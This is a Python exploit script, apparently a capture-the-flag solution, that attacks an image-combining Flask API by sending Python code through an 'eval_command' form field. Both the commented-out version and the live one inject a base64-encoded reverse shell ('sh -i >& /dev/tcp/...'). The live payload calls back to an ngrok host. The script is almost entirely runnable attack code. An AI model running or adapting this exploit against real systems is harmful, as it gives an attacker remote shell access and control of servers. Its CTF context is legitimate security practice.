

# import requests                                                                                                               
# import io                                                                                                                     
# import argparse                                                                                                               
# import base64                                                                                                                 
                                                                                                                              
                                                                                                                              
# def generate_reverse_shell_command(ip, port):                                                                                 
#     rev_shell = f"sh -i >& /dev/tcp/{ip}/{port} 0>&1"                                                                         
#     print(f"Generated reverse shell command: {rev_shell}")

#     rev_shell_base64 = base64.b64encode(rev_shell.encode()).decode()
#     print(f"Base64 encoded reverse shell: {rev_shell_base64}")

#     eval_command = f"echo {rev_shell_base64} | base64 -d | bash"
#     print(f"Eval command for injection: {eval_command}")

#     return eval_command


# def main(ip, port, url, image1_path, image2_path):
#     if not url.endswith("/combine"):
#         url = f"{url.rstrip('/')}/combine"

#     revshell = generate_reverse_shell_command(ip, port)
#     eval_command = f"__import__('os').popen('{revshell}').read()"

#     files = {
#         'image1': open(image1_path, 'rb'),
#         'image2': open(image2_path, 'rb')
#     }
#     data = {
#         'eval_command': eval_command
#     }

#     response = requests.post(url, files=files, data=data)

#     if response.status_code == 200:
#         try:
#             # Attempt to interpret the response as an image, but we don't really care about the actual image in this case
#             image = Image.open(io.BytesIO(response.content))
#             image.show()  # This will open the image
#         except Exception:
#             # If it's not an image, it's likely the flag or an error message
#             print(f"Flag or error: {response.content.decode()}")
#     else:
#         print(f"Failed to exploit: {response.status_code} - {response.text}")


# if __name__ == "__main__":
#     parser = argparse.ArgumentParser(
#         description='Exploit the Image Combiner API to retrieve the flag.')
#     parser.add_argument(
#         'url', type=str, help='The target URL of the Flask API (e.g., http://localhost:5000)')
#     parser.add_argument('image1', type=str,
#                         help='Path to the first image file')
#     parser.add_argument('image2', type=str,
#                         help='Path to the second image file')
#     parser.add_argument(
#         '--ip', type=str, help='The IP address to connect back to')
#     parser.add_argument('--port', type=int, help='The port to connect back to')

#     args = parser.parse_args()

#     main(args.ip, args.port, args.url, args.image1, args.image2)

import requests

url = "http://challenge.ctf.games:30550/combine"

file_png = open('image.png', 'rb').read()
files = {
    "image1": file_png,
    "image2": file_png
}

eval_command2 = f"__import__('os').system('echo c2ggLWkgPiYgL2Rldi90Y3AvNi50Y3Aubmdyb2suaW8vMTA1NzIgMD4mMQ== | base64 -d | bash')" #f"__import__('os').popen('{eval_command}').read()"

data= {
    "eval_command": eval_command2
}

res = requests.post(url,files=files,data=data)
print(res.text)